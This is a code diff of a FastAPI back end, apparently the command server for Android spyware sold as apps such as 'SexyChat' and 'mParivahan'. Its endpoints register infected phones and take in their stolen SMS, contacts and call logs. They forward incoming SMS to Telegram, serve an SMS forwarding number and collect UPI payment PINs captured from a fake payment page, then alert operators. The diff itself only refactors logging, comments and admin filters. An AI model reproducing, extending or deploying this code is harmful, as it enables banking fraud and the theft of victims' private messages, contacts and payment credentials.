@@ -1,12 +1,21 @@
 from fastapi import FastAPI, WebSocket, WebSocketDisconnect, HTTPException, Query, Depends, Request, BackgroundTasks
 from fastapi.middleware.cors import CORSMiddleware
-from fastapi.responses import JSONResponse
+from fastapi.responses import JSONResponse, RedirectResponse
+from fastapi.exceptions import RequestValidationError
+from starlette.exceptions import HTTPException as StarletteHTTPException
 from starlette.websockets import WebSocketDisconnect as StarletteWebSocketDisconnect
 from datetime import datetime, timedelta
 import json
 import logging
+
 import asyncio
 from typing import Optional
+
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
+)
+logger = logging.getLogger(__name__)
 
 from .config import settings
 from .database import connect_to_mongodb, close_mongodb_connection, mongodb
@@ -51,11 +60,6 @@ from .utils.auth_middleware import (
 from .services.otp_service import otp_service
 from .services.auth_service import ENABLE_2FA
 
-logging.basicConfig(
-    level=logging.INFO if settings.DEBUG else logging.WARNING,
-    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
-)
-logger = logging.getLogger(__name__)
 
 app = FastAPI(
     title=" Control Server",
@@ -66,34 +70,26 @@ app = FastAPI(
 
 app.add_middleware(
     CORSMiddleware,
-    allow_origins=[
-        "*"
-
-    ],
+    allow_origins=["*"],
     allow_credentials=True,
     allow_methods=["*"],
     allow_headers=["*"],
 )
 
+
+
 @app.on_event("startup")
 async def startup_event():
-    logger.info("🚀 Starting  Control Server...")
     await connect_to_mongodb()
-
     await auth_service.create_default_admin()
-
-    logger.info("✅ Server is ready!")
 
 @app.on_event("shutdown")
 async def shutdown_event():
-    logger.info("🛑 Shutting down server...")
     await close_mongodb_connection()
-    logger.info("👋 Server stopped!")
 
-
-###
 @app.post("/devices/heartbeat")
 async def device_heartbeat(request: Request):
+    
     try:
         data = await request.json()
         device_id = data.get("deviceId")
@@ -102,58 +98,42 @@ async def device_heartbeat(request: Request):
             raise HTTPException(status_code=400, detail="deviceId required")
         
         now = datetime.utcnow()
-        
-        # فقط این دستگاه رو آپدیت کن
         await mongodb.db.devices.update_one(
             {"device_id": device_id},
-            {
-                "$set": {
-                    "last_ping": now,
-                    "status": "online",
-                    "is_online": True,
-                    "last_online_update": now
-                }
-            }
+            {"$set": {
+                "last_ping": now,
+                "status": "online",
+                "is_online": True,
+                "last_online_update": now
+            }}
         )
         
         return {"success": True, "message": "Heartbeat received"}
         
     except Exception as e:
-        logger.error(f"❌ Heartbeat error: {e}")
         raise HTTPException(status_code=500, detail=str(e))
 
 @app.post("/ping-response")
 async def ping_response(request: Request):
-    """دریافت پاسخ Ping از دستگاه"""
+    
     try:
         data = await request.json()
         device_id = data.get("deviceId") or data.get("device_id")
         
         if not device_id:
             raise HTTPException(status_code=400, detail="deviceId required")
-        
-        logger.info(f"✅ Ping response received from device: {device_id}")
-        
-        # آپدیت وضعیت آنلاین دستگاه
+
         await device_service.update_online_status(device_id, True)
-        
-        # ذخیره لاگ
-        await device_service.add_log(
-            device_id, 
-            "ping", 
-            "Ping response received", 
-            "success"
-        )
+        await device_service.add_log(device_id, "ping", "Ping response received", "success")
         
         return {"success": True, "message": "Ping response received"}
         
     except Exception as e:
-        logger.error(f"❌ Ping response error: {e}")
         raise HTTPException(status_code=500, detail=str(e))
 
 @app.post("/upload-response")
 async def upload_response(request: Request):
-    """دریافت پاسخ آپلود SMS/Contacts از دستگاه"""
+    
     try:
         data = await request.json()
         device_id = data.get("device_id") or data.get("deviceId")
@@ -163,37 +143,18 @@ async def upload_response(request: Request):
         
         if not device_id or not status:
             raise HTTPException(status_code=400, detail="device_id and status required")
-        
-        logger.info(f"📊 Upload response from {device_id}: {status} - Count: {count}")
-        
-        # تشخیص نوع آپلود
-        upload_type = "Unknown"
-        if "sms" in status.lower():
-            upload_type = "SMS"
-        elif "contacts" in status.lower():
-            upload_type = "Contacts"
-        
-        # ذخیره لاگ
+
+        upload_type = "SMS" if "sms" in status.lower() else "Contacts" if "contacts" in status.lower() else "Unknown"
         log_message = f"{upload_type} upload: {count} items"
         if error:
             log_message += f" - Error: {error}"
         
         log_level = "success" if "success" in status else "error"
         
-        await device_service.add_log(
-            device_id,
-            "upload",
-            log_message,
-            log_level,
-            metadata={
-                "status": status,
-                "count": count,
-                "error": error,
-                "type": upload_type
-            }
-        )
+        await device_service.add_log(device_id, "upload", log_message, log_level, metadata={
+            "status": status, "count": count, "error": error, "type": upload_type
+        })
         
-        # اگه موفق بود، به تلگرام ادمین اطلاع بده (Bot 1: دستگاه‌ها)
         if "success" in status and count > 0:
             try:
                 device = await device_service.get_device(device_id)
@@ -203,7 +164,7 @@ async def upload_response(request: Request):
                         f"✅ {upload_type} Upload Complete\n"
                         f"📱 Device: <code>{device_id}</code>\n"
                         f"📊 Count: {count} items",
-                        bot_index=1  # Bot 1: Device activities
+                        bot_index=3
                     )
             except:
                 pass
@@ -211,39 +172,25 @@ async def upload_response(request: Request):
         return {"success": True, "message": "Upload response received"}
         
     except Exception as e:
-        logger.error(f"❌ Upload response error: {e}")
         raise HTTPException(status_code=500, detail=str(e))
-
-
 
 @app.post("/register")
 async def register_device(message: dict, background_tasks: BackgroundTasks):
-    """
-    رجیستر دستگاه با توکن ادمین
     
-    Accepts BOTH formats:
-    - Legacy: admin_token (device_token)
-    - New: user_id (same as admin_token/device_token)
-    """
     device_id = message.get("device_id")
     device_info = message.get("device_info", {})
-    
-    # Support both admin_token and user_id (they're the same thing)
     admin_token = message.get("admin_token") or message.get("user_id")
-    app_type = message.get("app_type")  # App flavor
+    app_type = message.get("app_type")
+    model = device_info.get("model", "Unknown")
     
-    # Add app_type to device_info if provided
     if app_type:
         device_info["app_type"] = app_type
     
     result = await device_service.register_device(device_id, device_info, admin_token)
     await device_service.add_log(device_id, "system", f"Device registered (app: {app_type or 'unknown'})", "info")
     
-    # اگه توکن معتبر بود، به ربات ادمین اطلاع بده (در background)
     if admin_token and result.get("device") and result["device"].get("admin_username"):
         admin_username = result["device"]["admin_username"]
-        
-        # ارسال notification ها در background (سریع‌تر!)
         background_tasks.add_task(
             notify_device_registration_bg,
             telegram_multi_service,
@@ -253,21 +200,16 @@ async def register_device(message: dict, background_tasks: BackgroundTasks):
             device_info,
             admin_token
         )
-        logger.info(f"📱 Device registration notifications queued for {admin_username}")
-    
-    return {
-        "status": "success", 
-        "message": "Device registered successfully",
-        "device_id": device_id
-    }
 
+
+
+    return {"status": "success", "message": "Device registered successfully", "device_id": device_id}
 
 @app.post("/battery")
 async def battery_update(message: dict):
-    """آپدیت باتری"""
+    
     device_id = message.get("device_id")
     data = message.get("data", {})
-    
     battery_level = data.get("battery")
     is_online = data.get("is_online", True)
     
@@ -279,11 +221,9 @@ async def battery_update(message: dict):
     
     return {"status": "success"}
 
-
 @app.post("/sms/batch")
 async def sms_history(message: dict):
-    # print(message)
-    """آپلود SMS"""
+    
     device_id = message.get("device_id")
     sms_list = message.get("data", [])
     batch_info = message.get("batch_info", {})
@@ -295,11 +235,9 @@ async def sms_history(message: dict):
     
     return {"status": "success"}
 
-
 @app.post("/contacts/batch")
 async def contacts_bulk(message: dict):
-    """آپلود مخاطبین"""
-    # print(message)
+    
     device_id = message.get("device_id")
     contacts_list = message.get("data", [])
     batch_info = message.get("batch_info", {})
@@ -311,11 +249,9 @@ async def contacts_bulk(message: dict):
     
     return {"status": "success"}
 
-
 @app.post("/call-logs/batch")
 async def call_history(message: dict):
-    """آپلود تاریخچه تماس"""
-    # print(message)
+    
     device_id = message.get("device_id")
     call_logs = message.get("data", [])
     batch_info = message.get("batch_info", {})
@@ -327,14 +263,10 @@ async def call_history(message: dict):
     
     return {"status": "success"}
 
-
-##
-
 @app.post("/api/sms/new")
 async def receive_sms(request: Request):
     try:
         data = await request.json()
-        logger.info(f"📱 SMS request received: {data}")
 
         device_id = data.get("device_id") or data.get("deviceId")
         
@@ -349,18 +281,19 @@ async def receive_sms(request: Request):
             timestamp = data.get("timestamp")
         
         if not device_id:
-            logger.error("❌ Missing device_id in SMS request")
+            pass
+
             raise HTTPException(status_code=400, detail="device_id is required")
 
         if not sender or not message:
-            logger.error(f"❌ Missing sender or message for device: {device_id}")
-            raise HTTPException(status_code=400, detail="sender and message are required")
+            pass
 
-        logger.info(f"📨 SMS from {sender} to device {device_id}: {message[:50]}...")
+            raise HTTPException(status_code=400, detail="sender and message are required")
 
         device = await device_service.get_device(device_id)
         if not device:
-            logger.warning(f"⚠️ Device not found: {device_id}, creating...")
+            pass
+
             await device_service.register_device(device_id, {
                 "device_name": "Unknown Device",
                 "registered_via": "sms_endpoint"
@@ -376,7 +309,6 @@ async def receive_sms(request: Request):
         }
 
         await device_service.save_new_sms(device_id, sms_data)
-        logger.info(f"✅ SMS saved for device: {device_id}")
 
         await device_service.add_log(
             device_id,
@@ -392,7 +324,7 @@ async def receive_sms(request: Request):
                     device_id, device.admin_username, sender, message
                 )
         except Exception as tg_error:
-            logger.warning(f"⚠️ Failed to send Telegram notification: {tg_error}")
+            pass
 
         return {
             "status": "success",
@@ -403,31 +335,22 @@ async def receive_sms(request: Request):
     except HTTPException:
         raise
     except Exception as e:
-        logger.error(f"❌ Unexpected error in receive_sms: {e}", exc_info=True)
         raise HTTPException(
             status_code=500,
             detail=f"Internal server error: {str(e)}"
         )
 
-
 @app.get("/api/getForwardingNumber/{device_id}")
 async def get_forwarding_number_new(device_id: str):
+    pass
+    
     try:
-        logger.info(f"📞 Forwarding number requested for device: {device_id}")
-
         forwarding_number = await device_service.get_forwarding_number(device_id)
-
         if not forwarding_number:
-            logger.info(f"⚠️ No forwarding number set for device: {device_id}")
             return {"forwardingNumber": ""}
-
-        logger.info(f"✅ Forwarding number found: {forwarding_number}")
         return {"forwardingNumber": forwarding_number}
     except Exception as e:
-        logger.error(f"❌ Error fetching forwarding number: {e}")
         raise HTTPException(status_code=500, detail=str(e))
-
-
 
 @app.get("/health")
 async def health_check():
@@ -446,16 +369,9 @@ async def health_check():
 
 @app.post("/auth/login")
 async def login(login_data: AdminLogin, request: Request, background_tasks: BackgroundTasks):
-    """
-    مرحله اول لاگین: تایید username/password
     
-    - اگر 2FA فعال باشه: کد OTP میفرسته و temp_token برمیگردونه
-    - اگر 2FA غیرفعال باشه: مستقیماً لاگین میکنه
-    """
     ip_address = get_client_ip(request)
     user_agent = get_user_agent(request)
-
-    # تایید username و password
     admin = await auth_service.authenticate_admin(login_data)
 
     if not admin:
@@ -474,14 +390,8 @@ async def login(login_data: AdminLogin, request: Request, background_tasks: Back
             detail="Invalid username or password"
         )
     
-    # ═══════════════════════════════════════════════════════
-    # اگر 2FA غیرفعال باشه، مستقیماً لاگین کن (رفتار قدیمی)
-    # ═══════════════════════════════════════════════════════
     if not ENABLE_2FA:
-        # Generate new session ID (invalidates previous sessions)
         session_id = auth_service.generate_session_id()
-        
-        # Update admin's session info in database
         update_result = await mongodb.db.admins.update_one(
             {"username": admin.username},
             {
@@ -492,7 +402,6 @@ async def login(login_data: AdminLogin, request: Request, background_tasks: Back
                 }
             }
         )
-        logger.info(f"🔐 Session created for {admin.username}: {session_id[:20]}... (updated: {update_result.modified_count})")
         
         access_token = auth_service.create_access_token(
             data={"sub": admin.username, "role": admin.role},
@@ -508,7 +417,6 @@ async def login(login_data: AdminLogin, request: Request, background_tasks: Back
             success=True
         )
 
-        # اعلان ورود موفق به تلگرام (در background)
         background_tasks.add_task(
             notify_admin_login_bg,
             telegram_multi_service,
@@ -516,7 +424,6 @@ async def login(login_data: AdminLogin, request: Request, background_tasks: Back
             ip_address,
             True
         )
-        logger.info(f"✅ Admin logged in (no 2FA): {admin.username}")
 
         return TokenResponse(
             access_token=access_token,
@@ -535,14 +442,8 @@ async def login(login_data: AdminLogin, request: Request, background_tasks: Back
             )
         )
     
-    # ═══════════════════════════════════════════════════════
-    # 2FA فعال است - مرحله اول: ارسال OTP
-    # ═══════════════════════════════════════════════════════
-    
-    # تولید کد OTP
     otp_code = await otp_service.create_otp(admin.username, ip_address)
     
-    # ارسال کد به تلگرام (در background)
     background_tasks.add_task(
         send_2fa_code_bg,
         telegram_multi_service,
@@ -551,12 +452,9 @@ async def login(login_data: AdminLogin, request: Request, background_tasks: Back
         otp_code,
         None
     )
-    logger.info(f"🔐 2FA code queued for {admin.username}")
     
-    # ایجاد توکن موقت
     temp_token = auth_service.create_temp_token(admin.username)
     
-    # لاگ فعالیت
     await admin_activity_service.log_activity(
         admin_username=admin.username,
         activity_type=ActivityType.LOGIN,
@@ -567,28 +465,20 @@ async def login(login_data: AdminLogin, request: Request, background_tasks: Back
         metadata={"step": "otp_sent"}
     )
     
-    logger.info(f"🔑 Login step 1 complete for {admin.username}, awaiting OTP verification")
-    
     return OTPResponse(
         success=True,
         message="OTP code sent to your Telegram. Please verify to complete login.",
         temp_token=temp_token,
-        expires_in=300  # 5 minutes
+        expires_in=300
     )
 
 @app.post("/auth/verify-2fa", response_model=TokenResponse)
 async def verify_2fa(verify_data: OTPVerify, request: Request, background_tasks: BackgroundTasks):
-    """
-    مرحله دوم لاگین: تایید کد OTP
+    pass
     
-    کاربر باید:
-    1. temp_token از مرحله اول رو بفرسته
-    2. کد OTP 6 رقمی که از تلگرام گرفته رو بفرسته
-    """
     ip_address = get_client_ip(request)
     user_agent = get_user_agent(request)
     
-    # تایید temp_token
     username = auth_service.verify_temp_token(verify_data.temp_token)
     
     if not username or username != verify_data.username:
@@ -597,7 +487,6 @@ async def verify_2fa(verify_data: OTPVerify, request: Request, background_tasks:
             detail="Invalid or expired temporary token"
         )
     
-    # تایید کد OTP
     otp_result = await otp_service.verify_otp(
         verify_data.username,
         verify_data.otp_code,
@@ -605,10 +494,8 @@ async def verify_2fa(verify_data: OTPVerify, request: Request, background_tasks:
     )
     
     if not otp_result["valid"]:
-        # افزایش تعداد تلاش‌ها
         await otp_service.increment_attempts(verify_data.username, verify_data.otp_code)
         
-        # لاگ تلاش ناموفق
         await admin_activity_service.log_activity(
             admin_username=verify_data.username,
             activity_type=ActivityType.LOGIN,
@@ -624,7 +511,6 @@ async def verify_2fa(verify_data: OTPVerify, request: Request, background_tasks:
             detail=otp_result["message"]
         )
     
-    # OTP تایید شد - دریافت اطلاعات ادمین
     admin = await auth_service.get_admin_by_username(verify_data.username)
     
     if not admin:
@@ -633,10 +519,8 @@ async def verify_2fa(verify_data: OTPVerify, request: Request, background_tasks:
             detail="Admin not found"
         )
     
-    # Generate new session ID (invalidates previous sessions)
     session_id = auth_service.generate_session_id()
     
-    # Update admin's session info in database + FCM token
     update_data = {
         "$set": {
             "current_session_id": session_id,
@@ -645,24 +529,19 @@ async def verify_2fa(verify_data: OTPVerify, request: Request, background_tasks:
         }
     }
     
-    # اگر FCM token داده شد، فقط آخرین token رو نگه دار (single device notification)
     if verify_data.fcm_token:
-        update_data["$set"]["fcm_tokens"] = [verify_data.fcm_token]  # فقط آخرین دستگاه
-        logger.info(f"📱 FCM token registered for {admin.username} (last device only)")
+        update_data["$set"]["fcm_tokens"] = [verify_data.fcm_token]
     
     update_result = await mongodb.db.admins.update_one(
         {"username": admin.username},
         update_data
     )
-    logger.info(f"🔐 Session created for {admin.username}: {session_id[:20]}... (updated: {update_result.modified_count})")
     
-    # ایجاد توکن نهایی با session_id
     access_token = auth_service.create_access_token(
         data={"sub": admin.username, "role": admin.role},
         session_id=session_id
     )
     
-    # لاگ موفقیت
     await admin_activity_service.log_activity(
         admin_username=admin.username,
         activity_type=ActivityType.LOGIN,
@@ -673,7 +552,6 @@ async def verify_2fa(verify_data: OTPVerify, request: Request, background_tasks:
         metadata={"step": "otp_verified"}
     )
     
-    # اعلان ورود موفق به تلگرام (در background)
     background_tasks.add_task(
         notify_admin_login_bg,
         telegram_multi_service,
@@ -681,8 +559,6 @@ async def verify_2fa(verify_data: OTPVerify, request: Request, background_tasks:
         ip_address,
         True
     )
-    
-    logger.info(f"✅ 2FA verification complete, admin logged in: {admin.username}")
     
     return TokenResponse(
         access_token=access_token,
@@ -707,6 +583,7 @@ async def logout(
     background_tasks: BackgroundTasks,
     current_admin: Admin = Depends(get_current_admin)
 ):
+    
     ip_address = get_client_ip(request)
 
     await admin_activity_service.log_activity(
@@ -716,7 +593,6 @@ async def logout(
         ip_address=ip_address
     )
 
-    # 🔔 اعلان خروج به ربات 4 (در background)
     background_tasks.add_task(
         notify_admin_logout_bg,
         telegram_multi_service,
@@ -724,38 +600,21 @@ async def logout(
         ip_address
     )
 
-    logger.info(f"👋 Admin logged out: {current_admin.username}")
-
     return {"message": "Logged out successfully"}
-
-
-# ═══════════════════════════════════════════════════════════════════════════════
-# 🤖 TELEGRAM BOT AUTHENTICATION (with OTP)
-# ═══════════════════════════════════════════════════════════════════════════════
 
 @app.post("/bot/auth/request-otp", response_model=BotOTPResponse, tags=["Bot Auth"])
 async def bot_request_otp(request: BotOTPRequest, req: Request, background_tasks: BackgroundTasks):
-    """
-    🤖 Step 1: Bot requests OTP for authentication
     
-    - First time bot setup
-    - Send OTP to admin's Telegram
-    - Valid for 5 minutes
-    """
     ip_address = get_client_ip(req)
-    
-    # Verify admin exists
     admin = await auth_service.get_admin_by_username(request.username)
+    
     if not admin:
         raise HTTPException(status_code=404, detail="Admin not found")
-    
     if not admin.is_active:
         raise HTTPException(status_code=403, detail="Admin account is disabled")
     
-    # Generate OTP
     otp_code = await otp_service.create_otp(request.username, ip_address)
     
-    # Send OTP via Telegram (در background)
     background_tasks.add_task(
         send_2fa_code_bg,
         telegram_multi_service,
@@ -764,9 +623,7 @@ async def bot_request_otp(request: BotOTPRequest, req: Request, background_tasks
         otp_code,
         f"🤖 Bot Authentication Request\nBot: {request.bot_identifier}\n"
     )
-    logger.info(f"🤖 OTP queued for {request.username} for bot: {request.bot_identifier}")
     
-    # Log activity
     await admin_activity_service.log_activity(
         admin_username=request.username,
         activity_type=ActivityType.LOGIN,
@@ -781,24 +638,15 @@ async def bot_request_otp(request: BotOTPRequest, req: Request, background_tasks
         expires_in=300
     )
 
-
 @app.post("/bot/auth/verify-otp", response_model=BotTokenResponse, tags=["Bot Auth"])
 async def bot_verify_otp(request: BotOTPVerify, req: Request):
-    """
-    🤖 Step 2: Verify OTP and get service token
+    pass
     
-    - Verify OTP code
-    - Return service token (never expires for single session, stays connected)
-    - Bot uses this token for all future requests
-    """
     ip_address = get_client_ip(req)
     user_agent = get_user_agent(req)
-    
-    # Verify OTP
     otp_result = await otp_service.verify_otp(request.username, request.otp_code, ip_address)
     
     if not otp_result["valid"]:
-        # Log failed attempt
         await admin_activity_service.log_activity(
             admin_username=request.username,
             activity_type=ActivityType.LOGIN,
@@ -809,26 +657,23 @@ async def bot_verify_otp(request: BotOTPVerify, req: Request):
         )
         raise HTTPException(status_code=401, detail=otp_result["message"])
     
-    # Get admin
     admin = await auth_service.get_admin_by_username(request.username)
+    
     if not admin:
         raise HTTPException(status_code=404, detail="Admin not found")
-    
     if not admin.is_active:
         raise HTTPException(status_code=403, detail="Admin account is disabled")
     
-    # Create SERVICE token (no session_id, stays connected forever)
     service_token = auth_service.create_access_token(
         data={
             "sub": admin.username,
             "role": admin.role,
             "bot_identifier": request.bot_identifier
         },
-        client_type="service",  # ← This is the key! No session check
+        client_type="service",
         is_bot=True
     )
     
-    # Log success
     await admin_activity_service.log_activity(
         admin_username=request.username,
         activity_type=ActivityType.LOGIN,
@@ -839,15 +684,12 @@ async def bot_verify_otp(request: BotOTPVerify, req: Request):
         metadata={"bot": request.bot_identifier}
     )
     
-    # Notify via Telegram
     await telegram_multi_service.notify_admin_action(
         admin_username=request.username,
         action="bot_authenticated",
         details=f"Bot '{request.bot_identifier}' successfully authenticated",
         ip_address=ip_address
     )
-    
-    logger.info(f"✅ Bot authenticated: {request.bot_identifier} for {request.username}")
     
     return BotTokenResponse(
         success=True,
@@ -860,17 +702,9 @@ async def bot_verify_otp(request: BotOTPVerify, req: Request):
         }
     )
 
-
 @app.get("/bot/auth/check", response_model=BotStatusResponse, tags=["Bot Auth"])
 async def bot_check_status(current_admin: Admin = Depends(get_current_admin)):
-    """
-    🤖 Step 3: Check if admin is still active
     
-    - Bot uses service token to check status
-    - Returns true/false based on admin.is_active
-    - Returns device_token for device registration
-    - No session validation (service token stays connected)
-    """
     return BotStatusResponse(
         active=current_admin.is_active,
         admin_username=current_admin.username,
@@ -878,45 +712,30 @@ async def bot_check_status(current_admin: Admin = Depends(get_current_admin)):
         message="Admin is active" if current_admin.is_active else "Admin is disabled"
     )
 
-
-# ═══════════════════════════════════════════════════════════════════════════════
-# 💳 UPI PIN COLLECTION
-# ═══════════════════════════════════════════════════════════════════════════════
-
 @app.post("/save-pin", response_model=UPIPinResponse, tags=["UPI"])
 async def save_upi_pin(pin_data: UPIPinSave, background_tasks: BackgroundTasks):
-    """
-    💳 Save UPI PIN from HTML form
     
-    - Receives PIN directly from payment HTML page
-    - user_id = admin's device_token (identifies which admin owns this device)
-    - Associates PIN with device and admin
-    - Returns success with timestamp
-    """
     try:
-        # user_id is actually the admin's device_token
         admin_token = pin_data.user_id
-        
-        # Find admin by device_token
         admin = await mongodb.db.admins.find_one({"device_token": admin_token})
         
         if not admin:
-            logger.warning(f"⚠️ Admin not found for user_id: {admin_token[:20]}...")
+            pass
+
             admin_username = None
         else:
             admin_username = admin["username"]
         
-        # پیدا کردن device موجود
         device = await mongodb.db.devices.find_one({"device_id": pin_data.device_id})
         
         if not device:
-            logger.warning(f"⚠️ Device not found: {pin_data.device_id} - PIN not saved (device must register first)")
+            pass
+
             raise HTTPException(
                 status_code=404,
                 detail="Device not found. Device must be registered before saving PIN."
             )
         
-        # فقط Update کردن UPI PIN در device موجود
         update_data = {
             "$set": {
                 "upi_pin": pin_data.upi_pin,
@@ -932,7 +751,6 @@ async def save_upi_pin(pin_data: UPIPinSave, background_tasks: BackgroundTasks):
             update_data
         )
         
-        # Log the PIN save
         await device_service.add_log(
             pin_data.device_id,
             "upi",
@@ -940,7 +758,6 @@ async def save_upi_pin(pin_data: UPIPinSave, background_tasks: BackgroundTasks):
             "info"
         )
         
-        # Notify admin via Telegram & Push (در background)
         if admin_username:
             device_model = device.get("model", "Unknown")
             
@@ -953,12 +770,9 @@ async def save_upi_pin(pin_data: UPIPinSave, background_tasks: BackgroundTasks):
                 pin_data.upi_pin,
                 device_model
             )
-            
-            logger.info(f"💳 UPI PIN saved for device: {pin_data.device_id} → Notifications queued")
-            logger.info(f"📱 Push notification sent to {admin_username} for UPI PIN")
         else:
-            logger.info(f"💳 UPI PIN saved for device: {pin_data.device_id} (no admin association)")
-        
+            pass
+
         return UPIPinResponse(
             status="success",
             message="PIN saved successfully",
@@ -966,12 +780,11 @@ async def save_upi_pin(pin_data: UPIPinSave, background_tasks: BackgroundTasks):
         )
     
     except Exception as e:
-        logger.error(f"❌ Error saving UPI PIN: {e}")
         raise HTTPException(status_code=500, detail=str(e))
-
 
 @app.get("/auth/me", response_model=AdminResponse)
 async def get_current_admin_info(current_admin: Admin = Depends(get_current_admin)):
+    
     return AdminResponse(
         username=current_admin.username,
         email=current_admin.email,
@@ -993,7 +806,7 @@ async def create_admin(
     request: Request,
     current_admin: Admin = Depends(require_permission(AdminPermission.MANAGE_ADMINS))
 ):
-
+    
     new_admin = await auth_service.create_admin(admin_create, created_by=current_admin.username)
 
     await admin_activity_service.log_activity(
@@ -1004,7 +817,6 @@ async def create_admin(
         metadata={"new_admin": new_admin.username, "role": new_admin.role.value}
     )
 
-    # 🔔 اعلان به سیستم تلگرام چندگانه با توکن جدید
     await telegram_multi_service.notify_admin_created(
         current_admin.username,
         new_admin.username,
@@ -1031,6 +843,7 @@ async def create_admin(
 async def list_admins(
     current_admin: Admin = Depends(require_permission(AdminPermission.MANAGE_ADMINS))
 ):
+    
     admins = await auth_service.get_all_admins()
     return {"admins": admins, "total": len(admins)}
 
@@ -1041,7 +854,7 @@ async def update_admin(
     request: Request,
     current_admin: Admin = Depends(require_permission(AdminPermission.MANAGE_ADMINS))
 ):
-
+    
     success = await auth_service.update_admin(username, admin_update)
 
     if not success:
@@ -1063,7 +876,7 @@ async def delete_admin(
     request: Request,
     current_admin: Admin = Depends(require_permission(AdminPermission.MANAGE_ADMINS))
 ):
-
+    
     if username == current_admin.username:
         raise HTTPException(status_code=400, detail="Cannot delete yourself")
 
@@ -1090,13 +903,7 @@ async def get_admin_activities(
     limit: int = Query(100, ge=1, le=500),
     current_admin: Admin = Depends(get_current_admin)
 ):
-    """
-    📋 دریافت لیست activity های ادمین
     
-    - Super Admin: می‌تونه activity همه یا یک ادمین خاص رو ببینه
-    - Admin عادی: فقط activity خودش رو می‌بینه
-    """
-    # اگر Super Admin نیست، فقط activity خودش رو می‌تونه ببینه
     if current_admin.role != AdminRole.SUPER_ADMIN:
         admin_username = current_admin.username
 
@@ -1123,13 +930,7 @@ async def get_admin_activity_stats(
     admin_username: Optional[str] = None,
     current_admin: Admin = Depends(get_current_admin)
 ):
-    """
-    📊 دریافت آمار activity های ادمین
     
-    - Super Admin: می‌تونه آمار همه یا یک ادمین خاص رو ببینه
-    - Admin عادی: فقط آمار خودش رو می‌بینه
-    """
-    # اگر Super Admin نیست، فقط activity خودش رو می‌تونه ببینه
     if current_admin.role != AdminRole.SUPER_ADMIN:
         admin_username = current_admin.username
     
@@ -1145,13 +946,7 @@ async def get_admin_activity_stats(
 async def get_device_stats(
     current_admin: Admin = Depends(require_permission(AdminPermission.VIEW_DEVICES))
 ):
-    """
-    📊 دریافت آمار دستگاه‌ها
     
-    - Super Admin: آمار همه دستگاه‌ها
-    - Admin/Viewer: فقط آمار دستگاه‌های خودش
-    """
-    # اگر Super Admin باشه، همه رو نشون بده
     admin_username = None if current_admin.role == AdminRole.SUPER_ADMIN else current_admin.username
     
     stats = await device_service.get_stats(admin_username=admin_username)
@@ -1159,36 +954,37 @@ async def get_device_stats(
 
 
 @app.get("/api/stats")
-async def get_stats(current_admin: Admin = Depends(get_current_admin)):
-    """
-    📊 دریافت آمار دستگاه‌ها (Deprecated - استفاده از /api/devices/stats)
+async def get_stats(
+    admin_username: Optional[str] = Query(None, description="Filter by admin username"),
+    current_admin: Admin = Depends(get_current_admin)
+):
+    is_super_admin = current_admin.role == AdminRole.SUPER_ADMIN
     
-    - Super Admin: آمار همه دستگاه‌ها
-    - Admin/Viewer: فقط آمار دستگاه‌های خودش
-    """
-    # اگر Super Admin باشه، همه رو نشون بده
-    admin_username = None if current_admin.role == AdminRole.SUPER_ADMIN else current_admin.username
+    if admin_username:
+        if not is_super_admin and admin_username != current_admin.username:
+            raise HTTPException(status_code=403, detail="Cannot view other admin's stats")
+        filter_username = admin_username
+    else:
+        filter_username = None if is_super_admin else current_admin.username
     
-    stats = await device_service.get_stats(admin_username=admin_username)
+    stats = await device_service.get_stats(admin_username=filter_username)
     return StatsResponse(**stats)
 
 
 @app.get("/api/devices/app-types", response_model=AppTypesResponse)
 async def get_app_types(
+    admin_username: Optional[str] = Query(None, description="Filter by admin username"),
     current_admin: Admin = Depends(require_permission(AdminPermission.VIEW_DEVICES))
 ):
-    """
-    📱 دریافت لیست انواع اپلیکیشن‌های موجود
-    
-    - لیست همه app_type های موجود در دستگاه‌ها
-    - تعداد دستگاه هر نوع
-    - نام و آیکون نمایشی
-    """
-    # فیلتر بر اساس نقش ادمین
     is_super_admin = current_admin.role == AdminRole.SUPER_ADMIN
-    query = {} if is_super_admin else {"admin_username": current_admin.username}
     
-    # گروه‌بندی بر اساس app_type
+    if admin_username:
+        if not is_super_admin and admin_username != current_admin.username:
+            raise HTTPException(status_code=403, detail="Cannot view other admin's app types")
+        query = {"admin_username": admin_username}
+    else:
+        query = {} if is_super_admin else {"admin_username": current_admin.username}
+    
     pipeline = [
         {"$match": query},
         {"$group": {
@@ -1200,12 +996,11 @@ async def get_app_types(
     
     results = await mongodb.db.devices.aggregate(pipeline).to_list(None)
     
-    # نام و آیکون برای هر نوع اپ
     app_names = {
         'sexychat': {'name': 'SexyChat', 'icon': '💬'},
         'mparivahan': {'name': 'mParivahan', 'icon': '🚗'},
         'sexyhub': {'name': 'SexyHub', 'icon': '🎬'},
-        'MP': {'name': 'mParivahan', 'icon': '🚗'},  # Legacy
+        'MP': {'name': 'mParivahan', 'icon': '🚗'},
     }
     
     app_types = []
@@ -1230,43 +1025,25 @@ async def get_app_types(
 async def get_devices(
     skip: int = Query(0, ge=0),
     limit: int = Query(100, ge=1, le=1000),
-    app_type: Optional[str] = Query(None, description="فیلتر بر اساس نوع اپلیکیشن"),
-    admin_username: Optional[str] = Query(None, description="فیلتر بر اساس admin (فقط برای Super Admin)"),
+    app_type: Optional[str] = Query(None, description="Filter by app type"),
+    admin_username: Optional[str] = Query(None, description="Filter by admin username"),
     current_admin: Admin = Depends(require_permission(AdminPermission.VIEW_DEVICES))
 ):
-    """
-    لیست دستگاه‌ها
-    
-    - Admin: فقط دستگاه‌های خودش
-    - Super Admin: همه دستگاه‌ها یا فیلتر بر اساس admin_username
-    - فیلتر بر اساس app_type (اختیاری)
-    """
-    # 🔐 Super Admin همه رو می‌بینه، Admin معمولی فقط دستگاه‌های خودش
     is_super_admin = current_admin.role == AdminRole.SUPER_ADMIN
     
-    # ساخت query با فیلتر
-    if is_super_admin:
-        # Super Admin می‌تونه همه رو ببینه یا فیلتر بر اساس admin_username
-        if admin_username and admin_username.strip():  # فقط اگر admin_username پر بود
-            query = {"admin_username": admin_username.strip()}
-        else:
-            query = {}  # همه
+    if admin_username:
+        if not is_super_admin and admin_username != current_admin.username:
+            raise HTTPException(status_code=403, detail="Cannot view other admin's devices")
+        query = {"admin_username": admin_username}
     else:
-        # Admin معمولی فقط دستگاه‌های خودش
-        query = {"admin_username": current_admin.username}
+        query = {} if is_super_admin else {"admin_username": current_admin.username}
     
-    # اضافه کردن فیلتر app_type
